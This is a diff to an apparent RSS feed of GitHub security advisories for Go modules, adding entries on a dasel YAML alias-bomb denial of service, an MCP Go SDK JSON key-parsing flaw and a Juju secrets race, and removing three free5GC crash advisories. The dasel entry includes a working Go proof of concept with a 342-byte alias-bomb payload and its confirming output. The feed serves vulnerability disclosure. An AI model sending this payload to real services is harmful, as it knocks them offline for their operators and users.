@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-19T12:06:23.490Z</updated>
+    <updated>2026-03-19T13:27:09.459Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,211 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tomwright/dasel/v3] Dasel has unbounded YAML alias expansion in dasel leads to CPU/memory denial of service]]></title>
+        <id>https://github.com/advisories/GHSA-4fcp-jxh7-23x8</id>
+        <link href="https://github.com/advisories/GHSA-4fcp-jxh7-23x8"/>
+        <updated>2026-03-19T12:50:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>dasel</code>'s YAML reader allows an attacker who can supply YAML for processing to trigger extreme CPU and memory consumption. The issue is in the library's own <code>UnmarshalYAML</code> implementation, which manually resolves alias nodes by recursively following <code>yaml.Node.Alias</code> pointers without any expansion budget, bypassing go-yaml v4's built-in alias expansion limit.</p>
+<p>The issue issue is on <code>v3.3.1</code> (<code>fba653c7f248aff10f2b89fca93929b64707dfc8</code>) and on the current default branch at commit <code>0dd6132e0c58edbd9b1a5f7ffd00dfab1e6085ad</code>. It is also verified the same code path is present in <code>v3.0.0</code> (<code>648f83baf070d9e00db8ff312febef857ec090a3</code>). A 342-byte payload did not complete within 5 seconds on the test system and exhibited unbounded resource growth.</p>
+<h3 id="details">Details</h3>
+<p>In <code>v3.3.1</code> (<code>fba653c7f248aff10f2b89fca93929b64707dfc8</code>), the reachable call path is:</p>
+<ul>
+<li>The YAML reader is registered in <a href="https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml.go"><code>parsing/yaml/yaml.go</code></a> and exposed via <code>parsing.Format("yaml").NewReader()</code></li>
+<li><code>(*yamlReader).Read</code> in <a href="https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L23-L48"><code>parsing/yaml/yaml_reader.go#L23-L48</code></a> uses <code>yaml.NewDecoder</code> to decode the input. Because <code>yamlValue</code> implements <code>UnmarshalYAML(*yaml.Node)</code>, the decoder passes the raw <code>*yaml.Node</code> tree to that custom unmarshaler</li>
+<li><code>(*yamlValue).UnmarshalYAML</code> in <a href="https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L57-L131"><code>parsing/yaml/yaml_reader.go#L57-L131</code></a> walks the Node tree</li>
+<li>When an <code>AliasNode</code> is encountered, the handler at <a href="https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L119-L126"><code>parsing/yaml/yaml_reader.go#L119-L126</code></a> recursively calls <code>newVal.UnmarshalYAML(value.Alias)</code> without tracking expansion count</li>
+</ul>
+<p>The root cause is that go-yaml v4 has two decoding paths:</p>
+<ol>
+<li><strong><code>Unmarshal</code> into Go values</strong>: Tracks alias expansion count and rejects documents with excessive aliasing (<code>"yaml: document contains excessive aliasing"</code>).</li>
+<li><strong><code>Decode</code> into <code>yaml.Node</code> / custom <code>UnmarshalYAML</code></strong>: Passes a compact Node tree where alias nodes are pointers to their anchors. No expansion occurs at this level.</li>
+</ol>
+<p>Dasel receives the compact Node tree via its <code>UnmarshalYAML(*yaml.Node)</code> hook and then recursively follows <code>value.Alias</code> pointers, re-expanding aliases without a budget:</p>
+<pre><code class="language-go">case yaml.AliasNode:
+    newVal := &amp;yamlValue{}
+    if err := newVal.UnmarshalYAML(value.Alias); err != nil {
+        return err
+    }
+    yv.value = newVal.value
+    yv.value.SetMetadataValue("yaml-alias", value.Value)
+</code></pre>
+<p>With a 9-level alias bomb (each level referencing the previous 9 times), this produces hundreds of millions of recursive expansions from a 342-byte input.</p>
+<p>Test environment:</p>
+<ul>
+<li>MacBook Air (Apple M2), macOS / Darwin <code>arm64</code></li>
+<li>Go <code>1.26.1</code></li>
+<li>dasel <code>v3.3.1</code> (<code>fba653c7f248aff10f2b89fca93929b64707dfc8</code>)</li>
+<li>go.yaml.in/yaml/v4 <code>v4.0.0-rc.3</code></li>
+</ul>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "runtime"
+    "time"
+
+    "github.com/tomwright/dasel/v3/parsing"
+    _ "github.com/tomwright/dasel/v3/parsing/yaml"
+    "go.yaml.in/yaml/v4"
+)
+
+func main() {
+    payload := `a: &amp;a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+`
+
+    fmt.Printf("Payload size: %d bytes\n", len(payload))
+    fmt.Printf("Go version: %s\n", runtime.Version())
+    fmt.Printf("GOARCH: %s\n", runtime.GOARCH)
+    fmt.Println()
+
+    // 1. go-yaml v4 Unmarshal correctly rejects this
+    fmt.Println("=== Test 1: Direct yaml.Unmarshal (should be rejected) ===")
+    {
+        var v interface{}
+        start := time.Now()
+        err := yaml.Unmarshal([]byte(payload), &amp;v)
+        elapsed := time.Since(start)
+        if err != nil {
+            fmt.Printf("SAFE: Rejected in %v: %v\n", elapsed, err)
+        } else {
+            fmt.Printf("VULNERABLE: Completed in %v\n", elapsed)
+        }
+    }
+    fmt.Println()
+
+    // 2. Dasel's YAML reader is vulnerable
+    fmt.Println("=== Test 2: Dasel YAML reader (VULNERABLE) ===")
+    done := make(chan string, 1)
+    go func() {
+        reader, err := parsing.Format("yaml").NewReader(parsing.DefaultReaderOptions())
+        if err != nil {
+            done &lt;- fmt.Sprintf("Error creating reader: %v", err)
+            return
+        }
+        start := time.Now()
+        _, err = reader.Read([]byte(payload))
+        elapsed := time.Since(start)
+        if err != nil {
+            done &lt;- fmt.Sprintf("Error after %v: %v", elapsed, err)
+        } else {
+            done &lt;- fmt.Sprintf("Completed in %v", elapsed)
+        }
+    }()
+
+    select {
+    case result := &lt;-done:
+        fmt.Println(result)
+    case &lt;-time.After(5 * time.Second):
+        fmt.Println("CONFIRMED: did not complete within 5s; unbounded alias expansion in progress")
+    }
+}
+</code></pre>
+<p>Observed output on <code>v3.3.1</code> in the test environment above:</p>
+<pre><code class="language-text">Payload size: 342 bytes
+Go version: go1.26.1
+GOARCH: arm64
+
+=== Test 1: Direct yaml.Unmarshal (should be rejected) ===
+SAFE: Rejected in 824.042µs: yaml: document contains excessive aliasing
+
+=== Test 2: Dasel YAML reader (VULNERABLE) ===
+CONFIRMED: did not complete within 5s; unbounded alias expansion in progress
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker who can supply YAML for processing by dasel can cause denial of service. The library's own <code>UnmarshalYAML</code> handler triggers unbounded recursive alias expansion from a 342-byte input. The process consumes 100% CPU and exhibits growing memory usage until externally terminated.</p>
+<p>This affects:</p>
+<ul>
+<li>CLI usage: when reading YAML from stdin or files via the CLI</li>
+<li>Library usage: any application using dasel's YAML reader to parse untrusted YAML</li>
+<li>The <code>parse("yaml", ...)</code> function in selectors</li>
+</ul>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>One likely fix is to add an alias expansion counter to <code>UnmarshalYAML</code> that limits the total number of alias resolutions, similar to go-yaml v4's internal limit. For example, track a counter across all recursive calls and return an error when it exceeds a threshold (e.g., 1,000,000 expansions).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/TomWright/dasel/security/advisories/GHSA-4fcp-jxh7-23x8">https://github.com/TomWright/dasel/security/advisories/GHSA-4fcp-jxh7-23x8</a></li>
+<li><a href="https://github.com/advisories/GHSA-4fcp-jxh7-23x8">https://github.com/advisories/GHSA-4fcp-jxh7-23x8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4fcp-jxh7-23x8</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-19T12:50:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/modelcontextprotocol/go-sdk] Improper handling of null Unicode character when parsing JSON in github.com/modelcontextprotocol/go-sdk]]></title>
+        <id>https://github.com/advisories/GHSA-q382-vc8q-7jhj</id>
+        <link href="https://github.com/advisories/GHSA-q382-vc8q-7jhj"/>
+        <updated>2026-03-19T12:44:08.000Z</updated>
+        <content type="html"><![CDATA[<p>The Go SDK recently transitioned to the <code>segmentio/encoding</code> library for JSON parsing in version 1.3.1. While this change addressed both case-insensitivity and ASCII folding issues, the new parser implemented aggressive key matching that treated keys with <code>null</code> Unicode characters appended at the end as equivalent to their base strings.</p>
+<h4 id="impact">Impact</h4>
+<p>When combined with duplicate keys, the described behavior leads to a "last key wins" resolution that could override the intended MCP message. This had the potential for:</p>
+<ul>
+<li><strong>Bypassing intermediary inspection:</strong> Proxies or policy layers that matched on exact field names may have failed to detect or filter these messages.</li>
+<li><strong>Cross-implementation inconsistency:</strong> Other MCP SDKs (TypeScript, Python) use case-sensitive parsing and would reject the same messages, creating potential security-boundary confusion.</li>
+</ul>
+<h4 id="fix">Fix:</h4>
+<p>The <code>segmentio/encoding</code> package was patched with a fix in <a href="https://github.com/segmentio/encoding/commit/7d5a25dbc5da13aed3cb047a127e4d0e96f536fb">https://github.com/segmentio/encoding/commit/7d5a25dbc5da13aed3cb047a127e4d0e96f536fb</a> and a new version of the package was released (<code>v0.5.4</code>). The SDK switched to the patched version of the dependency in 724dd47aa. Users are advised to update to v1.4.1 to resolve this issue.</p>
+<h4 id="credits">Credits:</h4>
+<p>Thank you to Francesco Lacerenza (Doyensec) for reporting this issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/go-sdk/security/advisories/GHSA-q382-vc8q-7jhj">https://github.com/modelcontextprotocol/go-sdk/security/advisories/GHSA-q382-vc8q-7jhj</a></li>
+<li><a href="https://github.com/modelcontextprotocol/go-sdk/commit/724dd47aa3431b9d4cf9ac2eebbf7b38a629afca">https://github.com/modelcontextprotocol/go-sdk/commit/724dd47aa3431b9d4cf9ac2eebbf7b38a629afca</a></li>
+<li><a href="https://github.com/segmentio/encoding/commit/7d5a25dbc5da13aed3cb047a127e4d0e96f536fb">https://github.com/segmentio/encoding/commit/7d5a25dbc5da13aed3cb047a127e4d0e96f536fb</a></li>
+<li><a href="https://github.com/advisories/GHSA-q382-vc8q-7jhj">https://github.com/advisories/GHSA-q382-vc8q-7jhj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q382-vc8q-7jhj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-19T12:44:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/juju/juju] Juju affected by timing ownership claim attack on new external back-end secrets]]></title>
+        <id>https://github.com/advisories/GHSA-gfgr-6hrj-85ww</id>
+        <link href="https://github.com/advisories/GHSA-gfgr-6hrj-85ww"/>
+        <updated>2026-03-19T12:42:53.000Z</updated>
+        <content type="html"><![CDATA[<p>A race condition in the secrets management subsystem of Juju versions 3.0.0 through 3.6.18 allows an authenticated unit agent to claim ownership of a newly initialized secret. Between generating a Juju Secret ID and creating the secret's first revision, an attacker authenticated as another unit agent can claim ownership of a known secret. This leads to the attacking unit being able to read the content of the initial secret revision.</p>
+<h3 id="impact">Impact</h3>
+<p>Between generating a Secret ID and creating the secret's first revision, an
+attacker authenticated as another unit agent can claim ownership of a known
+secret. This leads to the attacking unit being able to read the content of the
+initial secret revision.</p>
+<h3 id="patches">Patches</h3>
+<p>3.6.19</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/juju/juju/security/advisories/GHSA-gfgr-6hrj-85ww">https://github.com/juju/juju/security/advisories/GHSA-gfgr-6hrj-85ww</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32691">https://nvd.nist.gov/vuln/detail/CVE-2026-32691</a></li>
+<li><a href="https://github.com/advisories/GHSA-gfgr-6hrj-85ww">https://github.com/advisories/GHSA-gfgr-6hrj-85ww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gfgr-6hrj-85ww</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-19T12:42:52.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/nhost/nhost] Nhost Storage Affected by MIME Type Spoofing via Trusted Client Content-Type Header in Storage Upload]]></title>
         <id>https://github.com/advisories/GHSA-g9f6-9775-hffm</id>
@@ -1222,99 +1427,5 @@ s := grpc.NewServer(
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-18T20:06:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/ausf] free5GC AUSF UE Authentication Panic on Nil SuciSupiMap Interface Conversion]]></title>
-        <id>https://github.com/advisories/GHSA-4jrw-92fg-4jwx</id>
-        <link href="https://github.com/advisories/GHSA-4jrw-92fg-4jwx"/>
-        <updated>2026-03-18T20:06:15.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Impact</strong><br>This is an Improper Null Check vulnerability leading to Denial of Service.  </p>
-<ul>
-<li><strong>Security Impact</strong>: A remote attacker can cause the AUSF service to panic and crash by sending a crafted UE authentication request that triggers a nil interface conversion in the <code>GetSupiFromSuciSupiMap</code> function. This results in complete denial of service for the AUSF authentication service.  </li>
-<li><strong>Functional Impact</strong>: The <code>GetSupiFromSuciSupiMap</code> function attempts to perform an interface conversion from <code>interface{}</code> to <code>*context.SuciSupiMap</code> without checking if the underlying value is nil. When <code>SuciSupiMap</code> is nil, the code panics with "interface conversion: interface {} is nil, not *context.SuciSupiMap".  </li>
-<li><strong>Affected Parties</strong>: All deployments of free5GC v4.0.1 using the AUSF UE authentication service (<code>/nausf-auth/v1/ue-authentications</code> endpoint).</li>
-</ul>
-<p><strong>Patches</strong><br>Yes, the issue has been patched.<br>The fix is implemented in PR free5gc/ausf#52 (commit: [add specific commit hash if available]).<br>Users should upgrade to the next release of free5GC that includes this commit.</p>
-<p><strong>Workarounds</strong><br>There is no direct workaround at the application level. The recommendation is to apply the provided patch or restrict access to the AUSF API to trusted sources only.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-4jrw-92fg-4jwx">https://github.com/free5gc/free5gc/security/advisories/GHSA-4jrw-92fg-4jwx</a></li>
-<li><a href="https://github.com/free5gc/free5gc/issues/778">https://github.com/free5gc/free5gc/issues/778</a></li>
-<li><a href="https://github.com/free5gc/ausf/pull/52">https://github.com/free5gc/ausf/pull/52</a></li>
-<li><a href="https://github.com/free5gc/ausf/commit/3b9ac4403c2756dc89a5ed3cdcefe688458588aa">https://github.com/free5gc/ausf/commit/3b9ac4403c2756dc89a5ed3cdcefe688458588aa</a></li>
-<li><a href="https://github.com/advisories/GHSA-4jrw-92fg-4jwx">https://github.com/advisories/GHSA-4jrw-92fg-4jwx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4jrw-92fg-4jwx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-18T20:06:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/nrf] free5GC NRF Discovery EncodeGroupId Function Panics on Malformed group-id-list Parameter]]></title>
-        <id>https://github.com/advisories/GHSA-7c47-xr7q-p6hg</id>
-        <link href="https://github.com/advisories/GHSA-7c47-xr7q-p6hg"/>
-        <updated>2026-03-18T20:05:33.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Impact</strong><br>This is an Improper Input Validation vulnerability leading to Denial of Service.  </p>
-<ul>
-<li><strong>Security Impact</strong>: A remote attacker can cause the NRF service to panic and crash by sending a crafted HTTP GET request with a malformed <code>group-id-list</code> parameter. This results in complete denial of service for the NRF discovery service.  </li>
-<li><strong>Functional Impact</strong>: The <code>EncodeGroupId</code> function attempts to access array indices [0], [1], [2] without validating the length of the split data. When the parameter contains insufficient separator characters, the code panics with "index out of range".  </li>
-<li><strong>Affected Parties</strong>: All deployments of free5GC v4.0.1 using the NRF discovery service.</li>
-</ul>
-<p><strong>Patches</strong><br>Yes, the issue has been patched.<br>The fix is implemented in PR free5gc/nrf#80 (commit: [add fix reference here]).<br>Users should upgrade to the next release of free5GC that includes this commit.</p>
-<p><strong>Workarounds</strong><br>There is no direct workaround at the application level. The recommendation is to apply the provided patch or restrict access to the NRF API to trusted sources only.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-7c47-xr7q-p6hg">https://github.com/free5gc/free5gc/security/advisories/GHSA-7c47-xr7q-p6hg</a></li>
-<li><a href="https://github.com/free5gc/free5gc/issues/777">https://github.com/free5gc/free5gc/issues/777</a></li>
-<li><a href="https://github.com/free5gc/nrf/pull/80">https://github.com/free5gc/nrf/pull/80</a></li>
-<li><a href="https://github.com/free5gc/nrf/commit/dac77d8f8f2e0f041c5634fb3c685dcb9734b872">https://github.com/free5gc/nrf/commit/dac77d8f8f2e0f041c5634fb3c685dcb9734b872</a></li>
-<li><a href="https://github.com/advisories/GHSA-7c47-xr7q-p6hg">https://github.com/advisories/GHSA-7c47-xr7q-p6hg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7c47-xr7q-p6hg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-18T20:05:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/chf] Out-of-Bounds Slice Access in free5GC CHF Leading to DoS]]></title>
-        <id>https://github.com/advisories/GHSA-6g43-577r-wf4x</id>
-        <link href="https://github.com/advisories/GHSA-6g43-577r-wf4x"/>
-        <updated>2026-03-18T17:26:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>This is an out-of-bounds slice access vulnerability in the CHF <code>nchf-convergedcharging</code> service.
-A valid authenticated request to PUT <code>/nchf-convergedcharging/v3/recharging/:ueId?ratingGroup=...</code> can trigger a server-side panic in <code>github.com/free5gc/chf/internal/sbi.(*Server).RechargePut(...)</code> due to an out-of-range slice access. In the reported runtime, Gin recovery converts the panic into HTTP 500, but the recharge path remains remotely panic-triggerable and can be abused repeatedly to degrade recharge functionality and flood logs. In deployments without equivalent recovery handling, this panic may cause more severe service disruption.</p>
-<h3 id="patches">Patches</h3>
-<p><a href="https://github.com/free5gc/chf/pull/61">https://github.com/free5gc/chf/pull/61</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<ul>
-<li>Restrict access to the <code>nchf-convergedcharging</code> recharge endpoint to strictly trusted NF callers only.</li>
-<li>Apply rate limiting or network ACLs in front of the CHF SBI interface to reduce repeated panic-trigger attempts.</li>
-<li>If the recharge API is not required, temporarily disable or block external reachability to this route.</li>
-<li>Ensure panic recovery, monitoring, and alerting are enabled.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-6g43-577r-wf4x">https://github.com/free5gc/free5gc/security/advisories/GHSA-6g43-577r-wf4x</a></li>
-<li><a href="https://github.com/free5gc/free5gc/issues/864">https://github.com/free5gc/free5gc/issues/864</a></li>
-<li><a href="https://github.com/free5gc/chf/pull/61">https://github.com/free5gc/chf/pull/61</a></li>
-<li><a href="https://github.com/free5gc/chf/commit/55af766f321a00afa978e806548c96f8a7d2433e">https://github.com/free5gc/chf/commit/55af766f321a00afa978e806548c96f8a7d2433e</a></li>
-<li><a href="https://github.com/advisories/GHSA-6g43-577r-wf4x">https://github.com/advisories/GHSA-6g43-577r-wf4x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6g43-577r-wf4x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-18T17:26:27.000Z</published>
     </entry>
 </feed>
